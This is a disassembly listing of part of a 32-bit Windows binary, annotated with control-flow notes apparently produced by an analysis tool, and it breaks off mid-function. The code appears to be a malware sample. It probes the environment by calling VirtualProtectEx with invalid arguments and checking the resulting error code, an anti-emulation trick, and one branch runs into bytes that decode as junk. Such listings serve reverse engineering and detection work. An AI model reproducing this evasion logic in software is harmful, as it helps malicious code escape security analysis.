0x00401000:	pushl	%ebp	; from: 0x004169a1(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	movl	$0x0, -72(%ebp)
0x0040100d:	movl	$0x0, -24(%ebp)
0x00401014:	movl	$0x0, -112(%ebp)
0x0040101b:	movl	$0x0, -96(%ebp)
0x00401022:	movl	$0x0, -8(%ebp)
0x00401029:	movl	$0x0, -108(%ebp)
0x00401030:	movl	$0x0, -104(%ebp)
0x00401037:	movl	$0x0, -20(%ebp)
0x0040103e:	movl	$0x0, -76(%ebp)
0x00401045:	movl	$0x0, -16(%ebp)
0x0040104c:	movl	$0x0, -88(%ebp)
0x00401053:	movl	$0x0, -4(%ebp)
0x0040105a:	movl	$0x0, -92(%ebp)
0x00401061:	movl	$0x0, -48(%ebp)
0x00401068:	movl	$0x0, -84(%ebp)
0x0040106f:	movl	$0x0, -44(%ebp)
0x00401076:	movl	$0x0, -80(%ebp)
0x0040107d:	movl	$0x0, -12(%ebp)
0x00401084:	movl	0x004493e8, %eax
0x00401089:	movl	%eax, -40(%ebp)
0x0040108c:	movl	0x004493ec, %ecx
0x00401092:	movl	%ecx, -36(%ebp)
0x00401095:	movl	0x004493f0, %edx
0x0040109b:	movl	%edx, -32(%ebp)
0x0040109e:	movb	0x004493f4, %al
0x004010a3:	movb	%al, -28(%ebp)
0x004010a6:	movl	0x004493f8, %ecx
0x004010ac:	movl	%ecx, -64(%ebp)
0x004010af:	movl	0x004493fc, %edx
0x004010b5:	movl	%edx, -60(%ebp)
0x004010b8:	movl	0x00449400, %eax
0x004010bd:	movl	%eax, -56(%ebp)
0x004010c0:	movw	0x00449404, %cx
0x004010c7:	movw	%cx, -52(%ebp)
0x004010cb:	movb	0x00449406, %dl
0x004010d1:	movb	%dl, -50(%ebp)
0x004010d4:	movl	$0x40, -48(%ebp)
0x004010db:	leal	-64(%ebp), %eax
0x004010de:	pushl	%eax
0x004010df:	leal	-16(%ebp), %ecx
0x004010e2:	pushl	%ecx
0x004010e3:	call	ConvertSidToStringSidW@advapi32.dll	; targets: 0xff0000b0(MAY)

start:
0x0041547e:	pushl	%ebp
0x0041547f:	movl	%esp, %ebp
0x00415481:	subl	$0x54, %esp
0x00415484:	movl	$0x0, -52(%ebp)
0x0041548b:	movl	$0x0, -4(%ebp)
0x00415492:	movl	$0x0, -80(%ebp)
0x00415499:	movl	$0x0, -76(%ebp)
0x004154a0:	movl	$0x0, -48(%ebp)
0x004154a7:	leal	-72(%ebp), %eax
0x004154aa:	pushl	%eax
0x004154ab:	call	GetLocalTime@kernel32.dll	; targets: 0xff000090(MAY)
0x004154b1:	movl	-52(%ebp), %ecx
0x004154b4:	pushl	%ecx
0x004154b5:	call	0x004154e4	; targets: 0x004154e4(MAY)
0x004154ba:	addl	$0x4, %esp	; from: 0x004169af(MAY)
0x004154bd:	call	0x004169b0	; targets: 0x004169b0(MAY)
0x004154e4:	pushl	%ebp	; from: 0x004154b5(MAY)
0x004154e5:	movl	%esp, %ebp
0x004154e7:	subl	$0x3c, %esp
0x004154ea:	pushl	%esi
0x004154eb:	movl	$0x0, -60(%ebp)
0x004154f2:	movl	$0x0, -56(%ebp)
0x004154f9:	movl	$0x0, -48(%ebp)
0x00415500:	movl	$0x0, -36(%ebp)
0x00415507:	movl	$0x0, -28(%ebp)
0x0041550e:	movl	$0x0, -40(%ebp)
0x00415515:	movl	$0x449408, -44(%ebp)
0x0041551c:	movl	$0xf653e06f, -36(%ebp)
0x00415523:	movl	$0x0, -52(%ebp)
0x0041552a:	movl	-36(%ebp), %eax
0x0041552d:	movl	%eax, -32(%ebp)
0x00415530:	movl	$0x0, -4(%ebp)
0x00415537:	movl	GetLastError@kernel32.dll, %ecx
0x0041553d:	movl	%ecx, -4(%ebp)
0x00415540:	pushl	$0x0
0x00415542:	pushl	$0x4e
0x00415544:	pushl	$0x1e
0x00415546:	pushl	$0x0
0x00415548:	pushl	$0xffffffff
0x0041554a:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff0000c0(MAY)
0x00415550:	testl	%eax, %eax
0x00415552:	je	0x0041698f	; targets: 0x00415558(MAY), 0x0041698f(MAY)
0x00415558:	ficoml	0x7ce1377e(%ecx)	; from: 0x00415552(MAY)
0x00415559:	xchgl	%eax, %ecx	; from: 0x00415563(MAY)
0x0041555a:	jle	0x00415593	; targets: 0x00415593(MAY), 0x0041555c(MAY)
0x0041555c:	loope	0x004155da	; targets: 0x004155da(MAY), 0x0041555e(MAY)	; from: 0x0041555a(MAY)
0x0041555e:	addb	%cl, %bl	; from: 0x0041555c(MAY)
0x00415560:	popl	%ebp
0x00415561:	movb	$0xffffff9f, %bh
0x00415563:	loope	0x00415559	; targets: 0x00415565(MAY), 0x00415559(MAY)
0x00415565:	pushl	$0xe28feecb	; from: 0x00415563(MAY)
0x0041556a:	jl	0x0041556c	; targets: 0x0041556c(MAY), 0x0041556c(MAY)
0x0041556c:	lret	; targets: 0xe28feecb(MAY)	; from: 0x0041556a(MAY), 0x0041556a(MAY)

0x00415593:	lret	; targets: 0x00000000(MAY)	; from: 0x0041555a(MAY)

0x004155da:	addl	$0x3ea19a99, -48(%ebp)	; from: 0x0041555c(MAY)
0x004155e1:	andl	%ebp, %gs:-95(%edx)
0x004155e5:	decl	%edi
0x004155e6:	jae	0x00415632	; targets: 0x004155e8(MAY), 0x00415632(MAY)
0x004155e8:	outb	%al, %dx	; from: 0x004155e6(MAY)
0x004155e9:	fst	%st1
0x004155eb:	aas	
0x004155ec:	popl	%esi
0x004155ed:	scasb	%es:(%edi), %al
0x00415632:	jnl	0x00415670	; targets: 0x00415670(MAY), 0x00415634(MAY)	; from: 0x004155e6(MAY)
0x00415634:	xorb	$0x39, %al	; from: 0x00415632(MAY)
0x00415670:	lret	; targets: unresolved	; from: 0x00415632(MAY)

0x0041698f:	movl	-4(%ebp), %esi	; from: 0x00415552(MAY)
0x00416992:	call	%esi	; targets: 0xff000050(MAY)
0x00416994:	movl	%eax, -56(%ebp)
0x00416997:	cmpl	$0x57, -56(%ebp)
0x0041699b:	jne	0x004169a9	; targets: 0x004169a9(MAY), 0x0041699d(MAY)
0x0041699d:	movl	-32(%ebp), %edx	; from: 0x0041699b(MAY)
0x004169a0:	pushl	%edx
0x004169a1:	call	0x00401000	; targets: 0x00401000(MAY)
0x004169a9:	xorl	%eax, %eax	; from: 0x0041699b(MAY)
0x004169ab:	popl	%esi
0x004169ac:	movl	%ebp, %esp
0x004169ae:	popl	%ebp
0x004169af:	ret	; targets: 0x004154ba(MAY)

0x004169b0:	pushl	%ebp	; from: 0x004154bd(MAY)
0x004169b1:	movl	%esp, %ebp
0x004169b3:	subl	$0x124, %esp
